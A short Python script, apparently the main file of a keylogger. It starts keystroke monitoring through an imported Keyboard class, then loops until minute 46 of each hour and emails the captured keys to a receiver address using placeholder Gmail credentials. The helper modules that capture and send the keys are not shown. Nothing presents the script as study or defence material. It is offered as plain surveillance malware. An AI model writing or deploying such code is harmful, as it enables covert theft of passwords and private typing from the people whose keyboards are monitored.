from Email import Email
from Keyboard import Keyboard
from datetime import datetime as dt

time = 46
keyboard = Keyboard()
keyboard.mon_key()

while True:
    if dt.now().minute == time:
        email = Email("sender@gmail.com","senha",
                      "receiver@gmail.com",keyboard.get_keys())
        
        email.enviar_email()
        